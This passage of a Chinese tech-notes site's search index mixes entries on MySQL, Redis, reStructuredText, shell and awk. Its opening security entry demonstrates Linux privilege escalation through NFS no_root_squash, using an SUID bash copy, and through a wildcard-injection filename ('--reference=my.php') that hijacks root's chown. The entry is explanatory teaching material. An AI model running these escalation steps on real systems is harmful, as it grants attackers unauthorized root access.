则说明root用户会对共享目录拥有至高的权限控制, 就像是对本机的目录操作一样. 也就是说, 任何机器的root在此目录上都有最高权限. 我们在获得一台机器的root权限后, 可以通过nfs在另一台低权限机器上实现提权: mkdir /tmp/nfs mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # 将本机上的/tmp/nfs 挂载到共享目录 cp /bin/bash /tmp/nfs/bash chmod u+s /tmp/nfs/bash 设置共享目录上bash的suid 回到低权限机, 执行 /tmp/bash 完成提权 通配符提权 利用通配符实现Linux本地提权 一种古老的UNIX黑客技术—通配符注入 通配符是一个字符或一组字符, 可以用来替换某些范围/类别的字符. 在执行任何其他操作之前, 通配符首先要经过shell进行解释. 一些常见的通配符: * 星号可以与文件名中的任意数量的字符匹配, 包括0个字符. ? 问号用于匹配任意单个字符. [] 括号内包括一组字符, 其中任何一个字符都可以匹配该位置上的单个字符. – []中的连字符表示字符范围. ~ 单词开头的波浪符表示当前用户的主目录的名称. 如果该字符后面是另一个用户的登录名, 则表示该用户的主目录. 例1-通过Chown劫持文件所有者 前置, root想给多用户提供一个公共的目录: ┌──(root㉿3675b5ebb8ce)-[~] └─# mkdir /tmp/common ┌──(root㉿3675b5ebb8ce)-[~] └─# chmod 777 /tmp/common 用户 yanque 在其下创建了三个文件: ┌──(yanque㉿3675b5ebb8ce)-[/tmp/common] └─$ touch file1.php file2.php file3.php ┌──(yanque㉿3675b5ebb8ce)-[/tmp/common] └─$ ls -lh total 0 -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file1.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file2.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file3.php 攻击者 yq 发现了这个目录下的文件都是 yanque 的, 猜测root用户可能会对其使用通配符的方式进行授权操作, 于是做出以下操作: ┌──(yq㉿3675b5ebb8ce)-[/tmp/common] └─$ echo >--reference=my.php ┌──(yq㉿3675b5ebb8ce)-[/tmp/common] └─$ echo >my.php ┌──(yq㉿3675b5ebb8ce)-[/tmp/common] └─$ ls -lh total 8.0K -rw-r--r-- 1 yq yq 1 Mar 5 16:04 '--reference=my.php' -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file1.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file2.php -rw-r--r-- 1 yanque yanque 0 Mar 5 15:59 file3.php -rw-r--r-- 1 yq yq 1 Mar 5 16:04 my.php 技巧 猜测root可能会执行: cd /tmp/common && chown -R yanque:yanque *.php 企图让实际执行指令变为: chown yanque:yanque /tmp/common/* --reference=my.php root因为某些不知名的原因进行了授权操作: ┌──(root㉿3675b5ebb8ce)-[/] └─# cd /tmp/common/ ┌──(root㉿3675b5ebb8ce)-[/tmp/common] └─# chown -R yanque:yanque *.php chown: cannot access 'yanque:yanque': No such file or directory ┌──(root㉿3675b5ebb8ce)-[/tmp/common] └─# ls -lh total 8.0K -rw-r--r-- 1 yq yq 1 Mar 5 16:04 '--reference=my.php' -rw-r--r-- 1 yq yq 0 Mar 5 15:59 file1.php -rw-r--r-- 1 yq yq 0 Mar 5 15:59 file2.php -rw-r--r-- 1 yq yq 0 Mar 5 15:59 file3.php -rw-r--r-- 1 yq yq 1 Mar 5 16:04 my.php 权限变成了yq的. 例2-通过tar投送漏洞利用代码","tags":"安全","url":"/yq-doc-source-docs-Safety-Summary.html","loc":"/yq-doc-source-docs-Safety-Summary.html"},{"title":"masscan","text":"与 /docs/安全/kali/kali渗透专用指令/nmap 类似, 信息获取的准确度低一点, 速度会快一点.","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Masscan.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Masscan.html"},{"title":"数据类型VARCHAR和CHAR","text":"固定长度 & 可变长度 VARCHAR VARCHAR类型用于存储 可变长度 字符串，是最常见的字符串数据类型。 它比固定长度类型更节省空间，因为它仅使用必要的空间(根据实际字符串的长度改变存储空间)。 有一种情况例外，如果MySQL表使用ROW_FORMAT=FIXED创建的话，每一行都会使用定长存储。 CHAR CHAR类型用于存储固定长度字符串: MySQL总是根据定义的字符串长度分配足够的空间。 当存储CHAR值时，MySQL会删除字符串中的末尾空格 (在MySQL 4.1和更老版本中VARCHAR 也是这样实现的 —— 也就是说这些版本中CHAR和VARCHAR在逻辑上是一样的，区别只是在存储格式上)。 同时，CHAR值会根据需要采用空格进行剩余空间填充，以方便比较和检索。 但正因为其长度固定，所以会占据多余的空间，也是一种空间换时间的策略； 存储方式 VARCHAR VARCHAR需要使用1或2个额外字节记录字符串的长度: 如果列的最大长度小于或等于255字节，则只使用1个字节表示，否则使用2个字节。 假设采用latinl字符集，一个VARCHAR(10)的列需要11个字节的存储空间。 VARCHAR(1000)的列则需要1002 个字节，因为需要2个字节存储长度信息。 VARCHAR节省了存储空间，所以对性能也有帮助。 但是，由于行是变长的，在UPDATE时可能使行变得比原来更长，这就导致需要做额外的工作。 如果一个行占用的空间增长，并且在页内没有更多的空间可以存储， 在这种情况下，不同的存储引擎的处理方式是不一样的。 例如，MylSAM会将行拆成不同的片段存储，InnoDB则需要分裂页来使行可以放进页内。 CHAR CHAR适合存储很短或长度近似的字符串。 例如，CHAR非常适合存储密码的MD5值，因为这是一个定长的值。 对于经常变更的数据，CHAR也比VARCHAR更好，因为定长的CHAR类型不容易产生碎片。 对于非常短的列，CHAR比VARCHAR在存储空间上也更有效率。 例如用CHAR(1)来存储只有Y和N的值，如果采用单字节字符集只需要一个字节， 但是VARCHAR(1)却需要两个字节，因为还有一个记录长度的额外字节。 存储容量 CHAR 对于char类型来说，最多只能存放的字符个数为255，和编码无关，任何编码最大容量都是255。 VARCHAR MySQL行默认最大65535字节，是所有列共享（相加）的，所以VARCHAR的最大值受此限制。 表中只有单列字段情况下，varchar一般最多能存放(65535 - 3)个字节， varchar的最大有效长度通过最大行数据长度和使用的字符集来确定， 通常的最大长度是65532个字符（当字符串中的字符都只占1个字节时，能达到65532个字符）； 计算为什么是65532个字符？ 算法如下（有余数时向下取整）: 最大长度(字符数) = （行存储最大字节数 - NULL标识列占用字节数 - 长度标识字节数） / 字符集单字符最大字节数 NULL标识列占用字节数：允许NULL时，占一字节 长度标识字节数：记录长度的标识，长度小于等于255（28）时，占1字节；小于65535时（216）,占2字节 VARCHAR类型在4.1和5.0版本发生了很大的变化，使得情况更加复杂。 从MySQL 4.1开始，每个字符串列可以定义自己的字符集和排序规则。这些东西会很大程度上影响性能。 4.0版本及以下，MySQL中varchar长度是按字节展示，如varchar(20)，指的是20字节； 5.0版本及以上，MySQL中varchar长度是按字符展示。如varchar(20)，指的是20字符。 当然，行总长度还是65535字节，而字符和字节的换算，则与编码方式有关，不同的字符所占的字节是不同的。编码划分如下： GBK编码 一个英文字符占一个字节，中文2字节，单字符最大可占用2个字节。 UTF-8编码 一个英文字符占一个字节，中文3字节，单字符最大可占用3个字节。 utf8mb4编码 一个英文字符占一个字节，中文3字节，单字符最大占4个字节（如emoji表情4字节）。 假设当前还有6字节可以存放字符，按单字符占用最大字节数来算，可以存放3个GBK、或2个utf8、或1个utf8mb4。 思考：既然VARCHAR长度可变，那我要不要定到最大? 没错，相信你已经有答案了，别这么干！ 就像使用VARCHAR(5)和VARCHAR(200)存储 '陈哈哈'的磁盘空间开销是一样的。 那么使用更短的列有什么优势呢？ 事实证明有很大的优势。 更长的列会消耗更多的内存，因为MySQL通常会分配固定大小的内存块来保存内部值。 当然，在没拿到存储引擎存储的数据之前， 并不会知道我这一行拿出来的数据到底有多长，可能长度只有1，可能长度是500，那怎么办呢？ 那就只能先把最大空间分配好了，避免放不下的问题发生，这样实际上对于真实数据较短的varchar确实会造成空间的浪费。 举例：我向数据类型为：varchar（1000）的列插入了1024行数据， 但是每个只存一个字符，那么这1024行真实数据量其实只有1K， 但是我却需要约1M的内存去适应他。所以最好的策略是只分配真正需要的空间。 注解 与 CHAR 和 VARCHAR 类似的类型还有 BINARY 和 VARBINARY, 它们存储的是二进制字符串. 二进制字符串跟常规字符串非常相似，但是二进制字符串存储的是字节码而不是字符。 填充也不一样: MySQL填充BINARY采用的是 \\0 (零字节)而不是空格，在检索时也不会去掉填充值。 当需要存储二进制数据，并且希望MySQL使用字节码而不是字符进行比较时，这些类型是非常有用的。 二进制比较的优势并不仅仅体现在大小写敏感上。 MySQL比较BINARY字符串时，每次按一个字节，并且根据该字节的数值进行比较。 因此，二进制比 较比字符比较简单很多，所以也就更快。","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Data-type-Varchar-and-Char.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Data-type-Varchar-and-Char.html"},{"title":"函数API","text":"数值计算 round(num, n) 直接四舍五入，round($num, $n)，四舍五入保留 n 位小数 字符串拼接","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Function-API.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Function-API.html"},{"title":"底层实现","text":"基于epoll, 多路复用 I/O多路复用底层主要用的Linux 内核函数 （select, poll, epoll）来实现， windows不支持epoll实现，windows底层是基于winsock2的 select函数实现的（不开源） Linux下可参考 /docs/操作系统/linux/概念性/IO模型 底层数据结构 整体看是大的全局hash表(k-v) 但是对于value来说, 有不同情况. value常见支持类型: String List (比如消息队列) Set (比如关注列表) Hash (复杂最想存储) Zset（有序集合）SortSet (比如排行榜) String 简单动态字符串 能转整数的, 用int 小于等于44字节的, 用 \"embstr\" 大于44字节, 用 \"raw\" 如果要查看底层数据存储: object encoding $key Hash hash表, 压缩列表 List 压缩列表(ziplist), 双向链表 Set hash表, 整数数组 ZSet 压缩列表, 跳表(skiplist) 可能会在存储时候, 切换数据结构 跳表(skiplist)优化 对于每两个元素, 取第一个向上提取一层(建立冗余索引), 类似于B+树 提高查找性能","tags":"数据库","url":"/yq-doc-source-docs-database-redis-Underlying-implementation.html","loc":"/yq-doc-source-docs-database-redis-Underlying-implementation.html"},{"title":"Admonitions","text":"提示信息 Specific Admonitions 支持以下类型: attention caution danger error hint important note tip warning 如使用tip, 源码: .. tip:: this is a tip msg 效果 技巧 this is a tip msg Generic Admonition 与上区别更像是支持自定义警告标题 支持的类型: admonition 举例, 源码: .. admonition:: And, by the way... You can make up your own admonition too. 效果 And, by the way... You can make up your own admonition too.","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Admonitions.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Admonitions.html"},{"title":"body-elements","text":"可以理解为html的body 参考: docutils文档 -> body-elements topic 可以理解为自然小节, 能较好控制样式效果 源码: .. topic:: Topic Title Subsequent indented lines comprise the body of the topic, and are interpreted as body elements. 效果 Topic Title Subsequent indented lines comprise the body of the topic, and are interpreted as body elements. sidebar 支持的选项 subtitle: text 副标题, 可选 源码: .. sidebar:: sidebar title :subtitle: sidebar sub Title this is a sidebar ... 效果 (在右边, 屏幕侧边) sidebar title sidebar sub Title this is a sidebar ... line-block 一个保留原有缩进的段落, 不建议使用, 建议直接使用竖线 用例说明, 源码: .. line-block:: 早, 吃早饭 中 吃吃吃吃吃吃吃吃吃吃 晚 面条面条面条面条面条面条 效果 早, 吃早饭 中 吃吃吃吃吃吃吃吃吃吃 晚 面条面条面条面条面条面条 code 支持的命令选项: number-lines: [int] 是否展示行号, 值为起始行号, 默认为1 math 显示数学公式, 前提需要格式支持 epigraph 名言警句, 引用诗歌等 用例, 源码: .. epigraph:: No matter where you go, there you are. (译: 无论你去哪里，你都在那里)。 -- Buckaroo Banzai 效果 No matter where you go, there you are. (译: 无论你去哪里，你都在那里)。 —Buckaroo Banzai compound \"复合\"指令用于创建复合段落，它是包含多个物理正文元素(如简单段落、文字块、表格、列表等)的单个逻辑段落，而不是直接包含文本和内联元素。 例如, 源码: .. compound:: 如果要查看当前目录下所有文件, 可以使用ls命令:: ls ./ 某些无权限的文件可能无法访问, 这时需要给予相应的权限 效果 如果要查看当前目录下所有文件, 可以使用ls命令: ls ./ 某些无权限的文件可能无法访问, 这时需要给予相应的权限 container 注意紧跟着的相当于类属性(相当于HTML的CLASS属性), 具体的效果需要用户自定义, 具体怎么自定义暂时没从官方文档看到, 难不成是自定义CSS ? 比如以下的custom: .. container:: custom 本段可以以自定义方式呈现。","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Body-Elements.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Body-Elements.html"},{"title":"Directives for Substitution Definitions","text":"replace 用于替换上下文文本. 源码: .. |奥斯| replace:: 奥斯特洛夫斯基 |奥斯| 说过: 钢铁是我教你们练成的. 开个玩笑. 效果 奥斯特洛夫斯基 说过: 钢铁是我教你们练成的. 开个玩笑. 另外, 由于reStructuredText不支持嵌套内联标记，因此创建带有样式文本的引用的唯一方法是使用\"替换\"指令的替换. 例如: I recommend you try Python, the best language around . 对应源码: I recommend you try |Python|_. .. |Python| replace:: Python, *the* best language around .. _Python: https://www.python.org/ unicode 用于转换Unicode字符, 没什么应用场景, 见 unicode-character-codes date 用于嵌入当前日期, 格式等同于 time 模块的 time.strftime() 默认格式为 %Y-%m-%d 例, 源码: .. |date| date:: .. |time| date:: %H:%M 今天是 |date|. 文档被创建与 |date| at |time|. 效果 今天是 2024-03-21. 文档被创建与 2024-03-21 at 16:51.","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Directives-for-substitution-definitions.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Directives-for-substitution-definitions.html"},{"title":"Document Parts","text":"contents 生成当前文档目录 支持命令选项 depth: integer 目录深度, 默认不限制 local: flag (empty) 生成本地目录。条目将仅包括提供小节(flag)的子节。如果没有给出显式标题，目录将不会有标题。 backlinks: \"entry\" or \"top\" or \"none\" 从部分标题生成链接回到目录条目、目录本身，或不生成反向链接 class: text 设置类属性 用例, 源码: .. contents:: Here's a very long Table of Contents AAAAAA 效果 Here's a very long Table of Contents AAAAAA contents header / footer header / footer \"标题\"和\"页脚\"指令创建文档装饰，可用于页面导航、注释、时间/测试等。 例如: .. header:: This space for rent BBBBBBBB. 这将向文档标题添加一个段落，该段落将显示在生成的网页顶部或每个打印页面的顶部。 这些指令可以累计多次使用。目前只支持一个页眉和页脚。 警告 实际测试不适用于rst生成的文档, 无任何效果, 弃之.","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Document-parts.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Document-parts.html"},{"title":"Images","text":"Image 支持类型 image 支持的命令选项: alt: text 当应用不能加载图片时, 显示的文字 height: length 图片高度 width: length or percentage of the current line width 图片宽度 scale: integer percentage (the \"%\" symbol is optional) 图片缩放, 以百分比的形式, 默认 100% align: \"top\", \"middle\", \"bottom\", \"left\", \"center\", or \"right\" 图片位置 target: text (URI or reference name) 图片可被点击, 支持两种形式: - url, 点击跳转到url - 可以通过类似这样 `a name`_ 跳转 and the common options class and name. 示例, 源码: .. image:: ../../resources/images/2023-02-02-15-11-21.png :alt: test_image :scale: 50% :align: center :target: https://www.baidu.com Figure 命令类型: figure 与image的区别是, 可以在图片下标注文字段落(可选). 源码: .. figure:: ../../../resources/images/2023-02-02-15-55-24.png :scale: 50 % :alt: map to buried treasure This is the caption of the figure (a simple paragraph). The legend consists of all elements after the caption. In this case, the legend consists of this paragraph and the following table: +----------------------------------------------------------------+-----------------------+ | Symbol | Meaning | +================================================================+=======================+ | .. image:: ../../../resources/images/2023-02-02-15-55-24.png | | | :scale: 30% | Campground | | | | +----------------------------------------------------------------+-----------------------+ | .. image:: ../../../resources/images/2023-02-02-15-55-24.png | | | :scale: 30% | Lake | | | | +----------------------------------------------------------------+-----------------------+ | .. image:: ../../../resources/images/2023-02-02-15-55-24.png | | | :scale: 30% | Mountain | | | | +----------------------------------------------------------------+-----------------------+ .. csv-table:: :header: Symbol, Meaning .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Campground .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Lake .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Mountain 效果 This is the caption of the figure (a simple paragraph). The legend consists of all elements after the caption. In this case, the legend consists of this paragraph and the following table: Symbol Meaning Campground Lake Mountain Symbol Meaning Campground Lake Mountain 支持命令选项, 除了支持image的所有选项外, 还支持以下选项: align: \"left\", \"center\", or \"right\" 此处列出主要说明只支持以上三个参数 figwidth: \"image\", length, or percentage of current line width 注意更改的是所在区域的宽度而非图片宽度. 当参数值为图片路径时: 若图片不存在, 则忽略此选项; 若存在则使用该图片的真实宽度值(依赖python的Imaging库). 实际运作可参考下图: +---------------------------+ | figure | | | |<------ figwidth --------->| | | | +---------------------+ | | | image | | | | | | | |<--- width --------->| | | +---------------------+ | | | |The figure's caption should| |wrap at this width. | +---------------------------+ figclass: text 设置 classes 属性, 暂时不知道有什么用","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Images.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Images.html"},{"title":"Miscellaneous","text":"include 嵌入文件内容, 不建议使用. 见 including-an-external-document-fragment 警告 \"include\"指令代表一个潜在的安全漏洞。可以通过\"file_insertion_enabled\"运行时设置禁用它。 raw raw也存在安全问题, 故不建议使用. 支持的命令选项: file: string (newlines removed) 本地文件路径 url: string (whitespace removed) 文件网络路径 encoding: string 文件读取格式, 默认输入文件格式 raw可以将内容转换对应的格式, 如html, 例: 源码: .. raw:: html <hr width=500 size=10 color=red> 效果","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Miscellaneous.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-Miscellaneous.html"},{"title":"插入图片","text":"图片插入, 有以下指令可实现: image figure image 如: .. image:: ../resources/images/images/2022-11-03-14-24-31.png 支持选项: height 图像高度 width 图像宽度 scale 图像缩放, 百分比。 align 可为top, middle, bottom, left, center, right, 设置图像对齐方式 target 点击跳转 figure 如: .. figure:: ../resources/images/images/2022-11-03-14-24-31.png figure 可以自定义图片相关, 除了上面, 支持额外选项, 支持写图片备注 align 可为 left, center, right。 只能设置水平方向上的对齐方式 figwidth 设置图像宽度, 这将影响图像标题和图例的折行方式, 以确保它们的宽度不会超过这个值。 但是这并不影响内嵌的图片宽度, 图片的宽度需要用 width 选项设置: +---------------------------+ | figure | | | |<------ figwidth --------->| | | | +---------------------+ | | | image | | | | | | | |<--- width --------->| | | +---------------------+ | | | |The figure's caption should| |wrap at this width. | +---------------------------+","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Insert-picture.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Insert-picture.html"},{"title":"列表","text":"符号列表 可用符号: -、*、+ 无序列表: - hhhhhhhh - hhhhhhhh - hhhhhhhh - hhhhhhhh - hhhhhhhh - hhhhhhhh 有序列表, 支持数字、大小写字母和罗马数字: 1. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh a. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh #. hhhhhhhh","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-List.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-List.html"},{"title":"引用","text":"内部引用 即在同一个文件内的引用 对于同文件内的所有标题, 会自动存在引用链接 如有一个小节: 小节1 =================== 可以直接 加后下划线 引用: 小节1_ 注解 默认仅可用于当前rst文本 . 若需要支持小节能被所有文档引用, 需要在conf.py 配置 sphinx.ext.autosectionlabel . 不建议这么做, 因为如果存在重复标题会有冲突. 全文引用-标签引用 引用某一个位置 不仅可用于同一个文件内, 还可用在同文档项目的其他文件 目标位置(被引用位置)形式: .. _这是一个引用2: 引用位置的写法1(与上一节一致): 这是一个引用2_ 引用位置的写法2, 使用 ref :ref:`这是一个引用2` . 注解 ref 支持跨文档引用, 但是要注意夸文档引用定义的标签必须在标题前面(这个确定), 或者在标签下定义其内容结构(这个还没试过), 否则跨文档时无法找到 注意 ref 默认是找的是 title 与 caption, 需要支持小节的话, 需要在小节前面定义别名如下 或者使用内置拓展插件 sphinx.ext.autosectionlabel 直接支持小节 全文引用-引用整个文档 引用整个文档 使用doc指令, 直接引用rst文档(冒号后无空格): :doc:`引用pytest, test <../python/Pytest>`. :doc:`../python/Pytest`. 超链接 主要用于引用外部网址 如链接到百度: `百度 <https://www.baidu.com>`_ 此时 百度 会被识别为一个 target , 注意这个 target 不要有重复 效果: 百度 由于存在 target , 故可定义在其他地方: `百度`_ 效果, 百度 或者提前定义网址: .. _百度: https://www.baidu.com","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Quote.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Quote.html"},{"title":"侧边栏","text":"使用 sidebar 模块 Optional Sidebar Title Optional Sidebar Subtitle Subsequent indented lines comprise the body of the sidebar, and are interpreted as body elements. 源码: .. sidebar:: Optional Sidebar Title :subtitle: Optional Sidebar Subtitle Subsequent indented lines comprise the body of the sidebar, and are interpreted as body elements. 再有一个其他的啥","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Sidebar.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Sidebar.html"},{"title":"文本样式","text":"星号 单星号表示斜体 单星号, 字体斜体 . 源码: *单星号, 字体斜体* 双星号表示加粗 双星号, 字体粗体 . 源码: **双星号, 字体粗体** 反引号 单反引号, 表示斜体 源码: `单反引号, 表示斜体` 双反引号, 代码示例/行内文本. 说明: 通常显示为等宽文本, 空格可以保留, 换行不保留 源码: ``双反引号, 代码示例/行内文本. 说明: 通常显示为等宽文本, 空格可以保留, 换行不保留``","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Text-style.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Text-style.html"},{"title":"段落","text":"段落是被空行分割的文字片段, 左侧必须对齐（没有空格, 或者有相同多的空格）。 缩进的段落被视为引文。","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-paragraph.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-paragraph.html"},{"title":"标题","text":"标题可以用连续的符号下线表示, 上线可有可无: ========================= 可以使用的标题符号有 =、-、`、:、'、\"、~、&#94;、_ 、* 、+、 #、<、> , 注意: 长度大于标题长度, 连续使用表示同级标题, 不同的符号使用表示下一级标题 对于相同的符号, 有上标是一级标题, 没有上标是二级标题 (一级标题上下标都要有)。 标题最多分六级","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-title.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-title.html"},{"title":"React组件库","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-Component-library-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-Component-library-index.html"},{"title":"shell类型","text":"大致与 /docs/操作系统/linux/概念性/linux系统环境加载顺序 一致 登录shell 交互式登陆 直接通过终端输入用户信息登陆系统 如: su - username #或 su -l username 配置文件读取过程: /etc/profile --> /etc/profile.d/*.sh --> ~/.bash_profile --> /etc/bashrc 交互式登录shell: Bash reads and executes the /etc/profile (if it exists). After reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile in that order, and reads and executes the first one (that exists and is readable). When a login shell exits: Bash reads and executes ~/.bash_logout (if it exists). 非交互式登陆 图形界面的终端 执行脚本 如: su username 配置文件读取过程: ~/.bashrc/ --> /etc/bash_rc --> /etc/profile.d/*.sh 交互式非登陆shell: Bash reads and executes ~/.bashrc (if it exists) 登陆Linux的时候执行的文件过程: /etc/profile --> (~/.bash_profile | ~/.bash_login | ~/.profile) --> ~/.bashrc --> /etc/bashrc --> ~/.bash_logout 参考: http://groups.google.com/group/linux.debian.user/browse_thread/thread/2b71ecfc45789958/7bff24e3bae74b36?lnk=raot 详加载顺序可见 /docs/操作系统/linux/概念性/linux系统环境加载顺序 选项/参数 短选项(参数) 短横线加字母, 如: -h -a $option_arg 长选项(参数) 双短横线加单词, 如: --help --add $option_arg 普通参数 直接跟在后面的, 如: 'commit msg' 或者直接以双短横线开始作为分隔符的, 如: # 两个横线后面的部分都会被认为是参数了，而不再是前面的命令的选项了 -- 'commit msg' # 单横线也可以其实 - 'commit msg' 注解 bash的man page: A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-type.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-type.html"},{"title":"arp","text":"arp 命令用于显示和修改 IP 到 MAC 转换表 arp 命令 是 Address Resolution Protocol，地址解析协议， 是通过解析网络层地址来找寻数据链路层地址的一个网络协议包中极其重要的网络传输协议。 而该命令可以显示和修改 arp 协议解析表中的缓冲数据。 这个核心协议模块实现RFC826中定义的 Address Resolution Protocol [译注：即TCP/IP的第三层到第一层的地址转换协议]， 用于在直接相连的网络中换第二层硬件地址和 Ipv4 协议地址之间的转换。 用户除非想对其进行配置，否则一般不会直接操作这个模块。 实际上，它提供对核心中其它协议的服务。 用户进程可以使用 packet(7) 的 sockets，收到 ARP 包（译注：一译分组）。 还有一种机制是使用 netlink(7) sockets，在用户空间管理 ARP 缓存的机制。 我们也可以通过 ioctl (2) 控制任意 PF_INET socket上的 ARP 表 ARP 模块维护一个硬件地址到协议地址映射的缓存。 这个缓存有大小限制，所以不常用的和旧的记录（Entry）将被垃圾收集器清除（garbage-collected）， 垃圾收集器永远不能删除标为永久的记录。 我们可以使用ioctls直接操纵缓冲， 并且其性状可以用下面定义的 sysctl 调节。 如果在限定的时间（见下面的sysctl）内，一条现存映射没有肯定反馈时， 则认为相邻层的缓存记录失效。 为了再次向目标发送数据，ARP将首先试着询问本地arp进程 app_solicit 次， 获取更新了的 MAC（介质访问控制）地址。 如果失败，并且旧的MAC地址是已知的，则发送 ucast_solicit 次的 unicast probe。 如果仍然失败，则将向网络广播一个新的ARP请求,此时要 有待发送数据的队列 如果 Linux 接到一个地址请求，而且该地址指向 Linux 转发的地址， 并且接收接口打开了代理 arp 时，Linux 将自动添加一条非永久的代理 arp 记录； 如果存在拒绝到目标的路由，则不添加代理 arp 记录。 语法: arp（选项）（参数） 选项 -a 主机 ：显示 arp 缓冲区的所有条目； -H 地址类型 ：指定 arp 指令使用的地址类型； -D 使用指定接口的硬件地址； -e 以 Linux 的显示风格显示 arp 缓冲区中的条目； -f 文件 ：设置主机的 IP 地址与 MAC 地址的静态映射。 -n 以数字方式显示 arp 缓冲区中的条目； -v 显示详细的 arp 缓冲区条目，包括缓冲区条目的统计信息； -s <主机> <MAC地址> 主机 MAC 地址 ：设置指定的主机的 IP 地址与 MAC 地址的静态映射； -d <主机> 主机 ：从 arp 缓冲区中删除指定主机的 arp 条目； -i <接口> 接口 ：指定要操作 arp 缓冲区的网络接口； 如: [root@cs6 ~]# arp -n Address HWtype HWaddress Flags Mask Iface 10.0.0.1 ether 00:50:56:c0:00:08 C eth0 10.0.0.2 ether 00:50:56:f4:fb:52 C eth0 命令说明具体如下 Address 主机地址。 Hwtype 硬件类型。 Hwaddress 硬件地址。 Flags Mask 记录标志，\"C\"表示arp高速缓存中的条目，\"M\"表示静态的arp条目。 lface 网络接口。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ARP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ARP.html"},{"title":"awk","text":"文本和数据进行处理的编程语言 选项参数: -F <fs> fs指定分割符 -v<var= value> 赋值一个用户变量，将外部变量传递给awk -f <script> 从脚本文件中读取awk命令 -m <[fr] val> 对val值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能时Bell实验室awk拓展的功能，在标准awk不适用。 其他: $n 当前记录的第n个字段，$开头都表示字段 模式 /正则表达式/：使用通配符的拓展集 关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试 模式匹配表达式：用运算符 ~ （匹配）和 !~ （不匹配） BEGIB语句块、pattern语句块、END语句块：参见awk的工作原理 注解 语句块的书写, 最外层一定是单引号包裹, 如: $ echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | awk '{print $3}' 57da161f45ac 因为其内部是脚本内容, 用双引号, 会就地解析, 比如这里就是 $3 解析成当前的参数 awk内置变量（预定义变量） 常用 NF 字段个数，（读取的列数） 每一行 $0 拥有的字段总数 NR 记录数（行号），从1开始，新的文件延续上面的计数，新文件不从1开始. 目前awk所处理的第几行的数据 FNR 读取文件的记录数（行号），从1开始，新的文件重新从1开始计数 FS(Field Separator) 输入字段分隔符，默认是空格 OFS(Out of Field Separator) 输出字段分隔符 默认也是空格 RS(Record Separator) 输入行分隔符，默认为换行符 ORS(Output Record Separate) 输出行分隔符，默认为换行符 注解 RS、ORS、FS、OFS的英文解释绝不是这样的，这里只是解释清楚。建议去阅读awk的英文读物，其中解释了缩写的含义 其他参考 关于Field与Record 所有 说明：ANPG表示第一个支持变量的工具，[A]=awk、[N]=nawk、[P]=POSIXawk、[G]=gawk: $n 当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。 $0 这个变量包含执行过程中当前行的文本内容。 [N] ARGC 命令行参数的数目。 [G] ARGIND 命令行中当前文件的位置（从0开始算）。 [N] ARGV 包含命令行参数的数组。 [G] CONVFMT 数字转换格式（默认值为%.6g）。 [P] ENVIRON 环境变量关联数组。 [N] ERRNO 最后一个系统错误的描述。 [G] FIELDWIDTHS 